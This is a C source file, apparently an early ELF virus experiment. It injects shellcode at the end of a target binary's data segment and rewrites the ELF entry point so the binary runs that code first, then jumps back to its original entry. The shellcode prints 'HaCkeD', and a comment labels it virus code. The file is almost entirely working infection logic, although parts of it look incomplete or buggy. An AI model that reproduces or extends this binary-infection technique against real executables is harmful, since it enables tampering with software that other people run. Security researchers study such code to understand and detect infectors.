#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <elf.h>
#include <stdio.h>
#include <string.h>

/*mov rax, 0x030A44656b436148*/
/*push rax*/
/*lea rsi, [rsp]*/
/*mov rax, 1*/
/*mov rdi, 1*/
/*mov rdx, 7*/
/*syscall*/

char code2[44] = {	0x48,0xB8,0x48,0x61,0x43,0x6B,0x65,0x44,0x0A,0x03,0x50,
					0x48,0x8D,0x34,0x24,0xB8,0x01,0x00,0x00,0x00,0xBF,0x01,
					0x00,0x00,0x00,0xBA,0x07,0x00,0x00,0x00,0x0F,0x05,0x00,
					0xE9};

int codeLen = 34;

void	debug_code() {
	int i = 0;
	while (i < codeLen) {
		printf("%x ", ((uint8_t *)&code2)[i]);
		i++;
	}
	return;
}

int		main(int argc, char **argv) {
	int		fd = open("target", O_RDWR);
	char	buffer[1000];
	int		structNum = 0;
	int		secOffset = 0;

	Elf64_Ehdr *Ehdr = NULL;
	Elf64_Phdr *Phdr = NULL;
	Elf64_Shdr *Shdr = NULL;

	// ENTRY HEADER
	read(fd, buffer, sizeof(Elf64_Ehdr));
	Ehdr = (Elf64_Ehdr *)buffer;
	structNum = Ehdr->e_phnum;
	// GET VIRTUAL ENTRY ADDRESS
	printf("Entry point: %x\n", Ehdr->e_entry);

	// WRITE ENTRY ADD TO OUR VIRUS CODE
	void *addr = &code2;
	addr += codeLen;
	codeLen += 8;
	*(uint64_t *)addr = Ehdr->e_entry;

	// PARSE SEGMENTS
	off_t phdr_start = lseek(fd, Ehdr->e_phoff, SEEK_SET);
	read(fd, buffer, sizeof(Elf64_Phdr) * structNum);

	int i = 0;
	while (i < structNum) {
		Phdr = (Elf64_Phdr *)buffer + i;
		/*
			A  text  segment  commonly  has the flags PF_X and PF_R.  A data
			segment commonly has PF_X, PF_W, and PF_R.
			text flags value:	5 -> READ, EXECUTE
			data flags value:	7 -> READ, WRITE, EXECUTE
								6 -> READ, WRITE
			looks like my data segment for target is RW only
		*/
		// printf("Segment Type: %x\n", Phdr->p_type);
		// printf("Segment Size: %lx\n", Phdr->p_filesz);
		// printf("Segment Flag: %d\n", Phdr->p_flags);
		if (Phdr->p_flags == 5) {
			printf("Found text segment at offset: 0x%lx\n", Phdr->p_offset);
		}
		if (Phdr->p_type == 1 && Phdr->p_flags == 6) {
			printf("Found data segment at offset: 0x%lx\n", Phdr->p_offset);
			printf("End of data segment: 0x%x\n", Phdr->p_vaddr + Phdr->p_filesz);

			// SET FLAGS FOR DATA SEG
			// lseek(fd, Phdr + 4, SEEK_SET);
			printf("Flag: %d\n", Phdr->p_flags);
			// Phdr->p_flags = 7

			// SET ENTRY POINT AT END OF DATA SEG
			lseek(fd, 0x18, SEEK_SET);
			uint64_t to_write = Phdr->p_vaddr + Phdr->p_filesz;
			write(fd, &to_write, 8);

			// INJECT CODE AT END DATA SEGMENT
			lseek(fd, Phdr->p_vaddr + Phdr->p_filesz, SEEK_SET);
			int j = 0;
			// debug_code();
			while (j < codeLen) {
				write(fd, &code2[j], 1);
				j++;
			}
			printf("Injected %d hex values at address: 0x%lx\n", j, Phdr->p_vaddr + Phdr->p_filesz);

			// MUST CHANGE SECTION BSS?
		}
		i++;
	}
	close(fd);
	return 1;
}
